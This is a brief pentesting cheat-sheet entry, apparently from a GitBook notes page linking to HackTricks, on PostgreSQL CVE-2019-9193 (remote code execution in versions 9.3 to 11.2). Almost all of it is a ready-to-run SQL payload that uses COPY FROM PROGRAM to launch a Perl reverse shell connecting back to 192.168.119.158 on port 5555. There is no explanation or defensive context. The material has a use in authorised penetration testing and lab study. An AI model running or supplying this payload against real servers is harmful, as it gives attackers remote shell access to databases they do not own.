# CVEs

### CVE-2019–9193 - **RCE from version 9.3 to 11.2**

```text
CREATE TABLE files(cmd_output text);
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.119.158:5555");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection\#cve-2019-9193-rce-from-version-9-3-to-11-2" %}

\*\*\*\*



